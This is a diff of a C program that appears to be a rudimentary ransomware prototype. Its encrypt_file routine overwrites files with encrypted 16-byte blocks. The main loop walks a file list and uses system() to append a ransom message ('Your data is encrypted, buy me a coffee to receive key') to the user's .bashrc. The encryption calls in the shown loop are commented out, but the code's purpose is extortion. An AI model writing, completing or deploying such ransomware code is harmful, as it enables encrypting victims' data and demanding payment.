@@ -87,7 +87,7 @@ void encrypt_file(char * path){
         //}
         //if(strlen(buffer) < 16) printf("Plaintext: | %d\n\n", strlen(buffer));
         encrypt(buffer);
-        printf("Encrypt: %d | %d\n\n", sizeof(buffer), strlen(buffer));
+        //printf("Encrypt: %d | %d\n\n", sizeof(buffer), strlen(buffer));
 
         fwrite(buffer, 16, 1, fp_temp);
         fflush(fp_temp);
@@ -155,30 +155,10 @@ int main()
     for(int i =0; i< count_files; i++){
         printf("%s\n", list_all_files[i]);
         //encrypt_file(list_all_files[i]);
+        system("file=/home/$(whoami)/.bashrc; if ! grep -n encrypted $file; then"
+            " echo \"echo \"Your data is encrypted, buy me a coffee to receive"
+            " key to decrypt your data\"\" >> $file; fi");
         //decrypt_file(list_all_files[i]);
     }
-    //encrypt_file("/home/doanhnn/linux/test/test.c");
-    system("file=/home/$(whoami)/.bashrc; if ! grep -n encrypted $file; then echo \"echo \"Your data is encrypted, send me a coffee to receive key to decrypt your data\"\" >> $file; fi");
-
-    //decrypt_file("/home/doanhnn/linux/test/test.c");
-    //MCRYPT td, td2;
-    //decrypt(buffer1, 16, IV, key, keysize);
-    //printf("decrypt: %s\n", buffer1);
-/*    char* plaintext = "giR6fPtD6QefgMmpmMTB42+/lH4KGTj5AO7kXxFgApjsx8R/\/O0nOgROdnLSde8+q4j3v76XMgE0";
-    char* buffer;
-    int buffer_len = 80;
-    
-    buffer = calloc(1, buffer_len);
-    strncpy(buffer, plaintext, buffer_len);
-    printf("%d\n", strlen(plaintext));
-    printf("%d\n", strlen(buffer));
-    printf("==C==\n");
-    printf("plain:   %s\n", buffer);
-    //encrypt(buffer, buffer_len, IV, key, keysize); 
-    printf("cipher:  %s\n", encrypt(buffer));
-    printf("%d\n", strlen(encrypt(buffer)));
-
-    //decrypt(buffer, buffer_len, IV, key, keysize);
-    printf("decrypt: %s\n", decrypt(buffer));
-  */  return(0);
+    return(0);
 }
